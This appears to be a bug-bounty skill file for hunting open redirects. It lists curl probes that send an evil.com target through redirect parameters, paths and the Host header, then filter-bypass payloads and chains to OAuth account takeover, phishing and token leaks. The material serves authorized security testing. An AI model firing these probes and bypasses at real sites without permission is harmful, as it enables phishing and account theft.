---
name: hunt-open-redirect
description: Open redirect — parameter manipulation, path-based, host header, JavaScript location. Chains to OAuth abuse, phishing, ATO.
---

# OPEN REDIRECT HUNTING — 3 BULLETS MAX

**Core:** Redirect to attacker-controlled domain. Chains to OAuth abuse → ATO.

## DETECTION
```bash
# Parameter-based
curl -s -I "https://target.com/redirect?url=https://evil.com"
curl -s -I "https://target.com/redirect?next=https://evil.com"
curl -s -I "https://target.com/redirect?to=https://evil.com"
curl -s -I "https://target.com/redirect?dest=https://evil.com"
curl -s -I "https://target.com/redirect?return=https://evil.com"
# Path-based
curl -s -I "https://target.com/redirect/https://evil.com"
curl -s -I "https://target.com//evil.com"
# Host header
curl -s -I -H "Host: evil.com" "https://target.com/"
# JavaScript-based
curl -s "https://target.com/redirect?url=https://evil.com" | grep -i "location\|redirect\|window.open"
```

## BYPASS TECHNIQUES
```
Subdomain: https://evil.target.com → target.com subdomain
URL parsing: https://target.com@evil.com
Fragment: https://evil.com#@target.com
Double encoding: https://%65vil.com
Backslash: https://evil.com\@target.com
Unicode: https://evil.com％00.target.com
Open redirect chain: target.com/redirect?url=target.com/redirect?url=evil.com
```

## CHAINS
```
Open redirect → OAuth redirect_uri abuse → ATO → Critical ($200 → $50K)
Open redirect → phishing → credential theft → High ($200 → $10K)
Open redirect → JWT token leak via referrer → High ($200 → $10K)
```
